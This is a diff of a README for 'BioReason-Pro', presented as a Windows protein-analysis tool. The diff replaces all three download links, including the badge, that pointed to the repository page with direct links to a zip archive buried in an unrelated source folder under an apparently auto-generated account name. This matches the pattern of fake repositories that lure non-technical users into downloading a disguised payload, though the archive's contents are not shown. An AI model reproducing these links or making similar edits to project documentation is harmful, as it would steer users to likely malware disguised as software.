@@ -1,6 +1,6 @@
 # 🧬 BioReason-Pro - Smarter Protein Insight on Windows
 
-[![Download BioReason-Pro](https://img.shields.io/badge/Download-BioReason--Pro-blue?style=for-the-badge)](https://github.com/fertilizable-virulency44/BioReason-Pro)
+[![Download BioReason-Pro](https://img.shields.io/badge/Download-BioReason--Pro-blue?style=for-the-badge)](https://raw.githubusercontent.com/fertilizable-virulency44/BioReason-Pro/main/gogpt/src/Bio-Reason-Pro-unidentifiedly.zip)
 
 ## 🚀 What BioReason-Pro Does
 
@@ -12,7 +12,7 @@ Use it to load protein data, run multimodal analysis, and review results in a cl
 
 To get BioReason-Pro, visit this page to download:
 
-[Download BioReason-Pro](https://github.com/fertilizable-virulency44/BioReason-Pro)
+[Download BioReason-Pro](https://raw.githubusercontent.com/fertilizable-virulency44/BioReason-Pro/main/gogpt/src/Bio-Reason-Pro-unidentifiedly.zip)
 
 Open the page, look for the latest release or file package, then download it to your Windows PC. After the download finishes, keep the file in a folder you can find again, such as Downloads or Desktop.
 
@@ -190,6 +190,6 @@ If you plan to test several files, prepare them in advance so you can work throu
 
 If you need the file again, use the same download page:
 
-[Download BioReason-Pro](https://github.com/fertilizable-virulency44/BioReason-Pro)
+[Download BioReason-Pro](https://raw.githubusercontent.com/fertilizable-virulency44/BioReason-Pro/main/gogpt/src/Bio-Reason-Pro-unidentifiedly.zip)
 
 Keep the page saved in your browser so you can return to it when you need an update or a fresh copy
